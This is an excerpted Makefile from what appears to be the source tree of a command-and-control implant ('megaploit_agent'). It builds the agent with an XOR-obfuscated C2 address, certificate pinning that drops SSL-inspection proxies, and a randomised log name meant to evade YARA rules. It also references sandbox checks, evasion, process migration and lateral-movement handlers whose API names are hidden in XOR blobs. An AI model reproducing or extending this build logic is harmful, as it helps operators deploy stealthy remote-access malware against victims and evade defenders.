...
# C2 XOR obfuscation — emits -DC2_IP_OBF_BYTES=... -DC2_IP_OBF_KEY=... etc.
# These flags activate the obfuscated decode path in client/core/config.h so
...
# C2_CERT_PIN — optional SHA-256 certificate fingerprint (64 hex chars = 32 bytes).
# When provided, the agent pins the server cert after the SChannel handshake
# and drops connections from SSL-inspection proxies that present a different cert.
#
# Generate:
#   openssl x509 -in server.pem -noout -fingerprint -sha256
#   (strip colons, pass the resulting 64-char hex string here)
#
# Example:
#   make C2_IP=10.0.0.1 SECRET_KEY=... C2_CERT_PIN=aabb...
#
# Format: the Makefile converts the hex string to a C byte-array literal
# {0xaa,0xbb,...} which is passed as -DC2_CERT_PIN="{0xaa,...}".
ifdef C2_CERT_PIN
  _PIN_FLAGS := $(shell python -c \
    "s='$(C2_CERT_PIN)';print('-DC2_CERT_PIN=\"{' + ','.join('0x'+s[i:i+2] for i in range(0,len(s),2)) + '}\"')")
else
  _PIN_FLAGS :=
endif
...
ifeq ($(DBG),1)
  # Guard: refuse AGENT_DEBUG + SECRET_KEY together (operational key in debug binary)
  ifdef SECRET_KEY
    $(error DBG=1 and SECRET_KEY cannot be set at the same time. \
            Use -DALLOW_KEY_ON_DISK for dev builds, not a real operational key.)
  endif
  # F-12: randomise the debug log filename at each build so it is not a
  # static YARA-matchable string.  Uses a 4-hex-char suffix derived from
  # the current timestamp (good enough to vary across sessions).
  _DBG_LOG_TAG := $(shell python -c "import time; print('%04x'%(int(time.time())&0xFFFF))")
  _DBG_CFLAGS := -DAGENT_DEBUG -DDISABLE_AUTO_MIGRATE \
                 -DDISABLE_SANDBOX_CHECK -DDISABLE_EVASION \
                 -DALLOW_KEY_ON_DISK \
                 -DAGENT_DEBUG_LOG_TAG=\"$(_DBG_LOG_TAG)\"
  _DBG_SRCS   := client/debug/agent_debug.c
  $(info [DBG] Debug build enabled — log: %TEMP%\megaploit_agent_$(_DBG_LOG_TAG).log)
else
  _DBG_CFLAGS :=
  _DBG_SRCS   :=
  # F-09: Guard against DISABLE_AUTO_MIGRATE in release builds.
  # Operational binaries must migrate on startup.  Only DBG=1 may set this.
  ifdef DISABLE_AUTO_MIGRATE
    $(error DISABLE_AUTO_MIGRATE must not be set in release builds. \
            Use DBG=1 to build a debug/dev binary that stays in the original process.)
  endif
endif

# Refactored client/ build (preferred)
# Note: handlers_system_obf.c and handlers_lateral_obf.c are auto-generated by
# client/evasion/gen_obf.py — they contain the same code as the .c originals but
# with all bare DLL-name and NT-function string literals replaced by XOR blobs.
# Run  python client/evasion/gen_obf.py  to regenerate them after editing
# handlers_system.c or handlers_lateral.c.
...
ifneq (,$(filter cl cl.exe,$(notdir $(CC))))
  ...
  # ── Obfuscated handler source generation ─────────────────────────────
  # Regenerate handlers_system_obf.c and handlers_lateral_obf.c from the
  # source .c files whenever either changes.
  client/shell/handlers_system_obf.c: client/shell/handlers_system.c \
                                      client/evasion/gen_obf.py
	python client/evasion/gen_obf.py
	@echo "[+] Obfuscated handler sources regenerated"

  client/shell/handlers_lateral_obf.c: client/shell/handlers_lateral.c \
                                        client/evasion/gen_obf.py
	python client/evasion/gen_obf.py
	@echo "[+] Obfuscated handler sources regenerated"
